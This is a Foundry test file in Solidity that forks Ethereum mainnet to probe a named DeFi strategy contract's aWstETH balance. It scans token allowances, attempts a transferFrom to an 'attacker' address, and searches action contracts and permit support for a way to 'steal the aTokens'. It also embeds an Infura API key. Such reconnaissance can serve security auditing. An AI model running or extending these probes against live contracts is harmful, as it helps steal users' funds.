// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IAavePool {
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
}

contract ATokenExploitTest is Test {
    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant aWstETH = 0x0B925eD163218f6662a35e0f0371Ac234f9E9371;
    
    address constant STRATEGY_0 = 0x60d2D94aCB969CA54e781007eE89F04c1A2e5943;
    address constant ACTION_EXECUTOR = 0xb1593193Bcd7CEcc3d19597658003d735D1e9E94;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    
    // Whitelisted actions
    address constant AAVE_WITHDRAW = 0x0039d822156FF2FD28ac6e19A518660890fcD2E0;
    address constant AAVE_SUPPLY = 0x3503152722beeE269E9B4E0921F2c3D44C90d2b5;
    
    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_CheckATokenApprovals() public view {
        console.log("=== CHECKING aWstETH APPROVALS FROM STRATEGY 0 ===\n");
        
        uint256 aBalance = IERC20(aWstETH).balanceOf(STRATEGY_0);
        console.log("Strategy 0 aWstETH balance:", aBalance / 1e18, "aWstETH");
        console.log("Value: ~$", (aBalance / 1e18) * 2300, "USD");
        
        // Check approvals to various addresses
        address[10] memory spenders = [
            AAVE_POOL,
            ACTION_EXECUTOR,
            VAULT,
            AAVE_WITHDRAW,
            AAVE_SUPPLY,
            0x89f57D3617F6a9FF877fEa34Dd0688b2840Ef50e, // StrategyExecutor
            0x97c03F52244E60BB18511Cbf03f890D5886f1F47, // StrategyStorage
            0x2225DAbFfC7F862c99477381E971E8B1FDaB467e, // Owner
            wstETH,
            attacker
        ];
        
        console.log("\nChecking aWstETH approvals:");
        for (uint i = 0; i < spenders.length; i++) {
            uint256 allowance = IERC20(aWstETH).allowance(STRATEGY_0, spenders[i]);
            if (allowance > 0) {
                console.log("  Approved to:", spenders[i]);
                console.log("  Amount:", allowance);
                if (allowance == type(uint256).max) {
                    console.log("  *** MAX APPROVAL ***");
                }
            }
        }
    }

    function test_DirectATokenTransfer() public {
        console.log("=== ATTEMPTING DIRECT aWstETH TRANSFER ===\n");
        
        uint256 strategyBalance = IERC20(aWstETH).balanceOf(STRATEGY_0);
        console.log("Strategy 0 aWstETH:", strategyBalance / 1e18);
        
        vm.startPrank(attacker);
        
        // Try direct transferFrom (should fail unless approved)
        try IERC20(aWstETH).transferFrom(STRATEGY_0, attacker, strategyBalance) returns (bool success) {
            if (success) {
                console.log("CRITICAL: Direct transfer succeeded!");
                console.log("Attacker received:", IERC20(aWstETH).balanceOf(attacker) / 1e18, "aWstETH");
            }
        } catch {
            console.log("Direct transferFrom failed (expected - no approval)");
        }
        
        vm.stopPrank();
    }

    function test_ExploitViaActionExecutor() public {
        console.log("=== ATTEMPTING EXPLOIT VIA ACTION EXECUTOR ===\n");
        
        // If Strategy has approved ActionExecutor for aWstETH,
        // and there's an action that does transferFrom,
        // we could potentially steal the aTokens
        
        uint256 allowance = IERC20(aWstETH).allowance(STRATEGY_0, ACTION_EXECUTOR);
        console.log("Strategy's aWstETH approval to ActionExecutor:", allowance);
        
        if (allowance > 0) {
            console.log("*** POTENTIAL EXPLOIT PATH FOUND ***");
            // Need to find an action that does transferFrom with controllable params
        }
        
        // Check approval to each action contract
        address[4] memory actions = [
            AAVE_WITHDRAW,
            AAVE_SUPPLY,
            address(0x313Ca6136521D22A7Ea763B3566Ed0B53F5B3AB9), // VaultPull
            address(0xb8cD2bA2A0Ada353aE15398618Fafb1d7BD558C5)  // LidoUnwrap
        ];
        
        for (uint i = 0; i < actions.length; i++) {
            uint256 actionAllowance = IERC20(aWstETH).allowance(STRATEGY_0, actions[i]);
            if (actionAllowance > 0) {
                console.log("Strategy approved action:", actions[i]);
                console.log("  Amount:", actionAllowance);
            }
        }
    }

    function test_ScanAllATokenApprovals() public view {
        console.log("=== SCANNING ALL POSSIBLE aWstETH SPENDERS ===\n");
        
        // Scan storage to find any non-zero approvals
        // aWstETH is ERC20, approvals are typically at: keccak256(spender, keccak256(owner, 1))
        // But we can also check known addresses
        
        console.log("Checking common DeFi protocols for aWstETH approval from Strategy 0...\n");
        
        // Check a wide range of addresses
        for (uint160 i = 0; i < 20; i++) {
            // Check incrementally from Strategy address
            address testAddr = address(uint160(STRATEGY_0) + i);
            uint256 allowance = IERC20(aWstETH).allowance(STRATEGY_0, testAddr);
            if (allowance > 0) {
                console.log("Found approval to:", testAddr);
                console.log("Amount:", allowance);
            }
        }
        
        // Check Strategy's own address
        uint256 selfAllowance = IERC20(aWstETH).allowance(STRATEGY_0, STRATEGY_0);
        if (selfAllowance > 0) {
            console.log("Self-approval:", selfAllowance);
        }
    }

    function test_CheckDelegationAndPermits() public view {
        console.log("=== CHECKING FOR PERMIT/DELEGATION ===\n");
        
        // Some aTokens have permit functionality
        // Check if we can use permit to get approval
        
        bytes4 permitSelector = bytes4(keccak256("permit(address,address,uint256,uint256,uint8,bytes32,bytes32)"));
        bytes4 delegateSelector = bytes4(keccak256("delegateBySig(address,uint256,uint256,uint8,bytes32,bytes32)"));
        
        // Check if aWstETH has these functions
        (bool hasPermit,) = aWstETH.staticcall(abi.encodeWithSelector(bytes4(keccak256("DOMAIN_SEPARATOR()"))));
        console.log("aWstETH has DOMAIN_SEPARATOR (permit support):", hasPermit);
        
        // Check aToken code for delegation
        bytes memory code = aWstETH.code;
        console.log("aWstETH code size:", code.length);
    }
}
